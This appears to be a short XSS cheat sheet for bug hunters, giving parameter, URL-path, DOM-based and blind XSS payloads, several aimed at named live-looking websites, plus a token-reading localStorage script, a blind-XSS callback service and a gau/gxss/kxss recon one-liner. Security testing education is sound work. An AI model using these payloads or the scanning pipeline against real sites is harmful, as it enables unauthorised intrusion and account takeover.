
# Cross-Site Scripting (XSS) Cheat Sheet

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by others. This document covers different types of XSS and tools to detect and exploit them.

---

## 🔍 Parameter-Based XSS

Not all XSS vulnerabilities are found via search fields — many appear in URL parameters.

### Example:
```
https://www.fenixlight.com/product/index.php?id=37%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&type=7%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
```

In this example, the `id` and `type` parameters are injected with a script payload.

---

## 🧪 URL Path-Based XSS

Sometimes the vulnerability lies in the **URL path**, not just parameters.

### Example:
```
Original: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.html  
Tested:   https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.htmlHELLO
```

If `HELLO` is reflected on the frontend, it can be escalated using:

```js
-prompt(8)-
```

---

## ⚙️ DOM-Based XSS

DOM-Based XSS occurs when the vulnerability is within JavaScript running in the page, not in the HTML response.

### Example:
```html
<input type='hidden' id='utm_medium' value=''>
```

Try modifying the URL:
```
view-source:https://example.com/?utm_medium=<img src=x onerror=prompt(1)>
```

If the frontend JavaScript reflects `utm_medium` content into the DOM unsafely, you're vulnerable.

---

## 🕵️ Blind XSS

With **Blind XSS**, the payload doesn't execute immediately. Instead, it gets triggered when viewed in an admin panel or backend dashboard.

### Steps:
1. Use platforms like [https://xss.report/dashboard](https://xss.report/dashboard)
2. Inject payloads into input fields, headers, or metadata.

### Why it matters:
If the app stores sensitive data (like tokens) in localStorage/sessionStorage, you can extract it.

```html
<script>alert(localStorage.hjUserAttributes)</script>
```

This leads to:
**CORS → XSS → ATO (Account Takeover)**

---

## 🛠️ Useful Commands & Tools

### Terminal One-Liner:
```bash
echo https://www.oshi.pk | gau | gf XSS | uro | gxss | kxss | tee out.txt
```

### Tools:
- `python3 loxs.py`
- [`dalfox`](https://github.com/hahwul/dalfox) - Best auto-scanner for XSS
- [`XSStrike`](https://github.com/s0md3v/XSStrike) - WAF bypass and intelligent payload generation

---

> ⚠️ Always perform testing on sites you **own** or have **explicit permission** to test.

---

**© 2025 Daksh Bhagwani | DBugs.org**
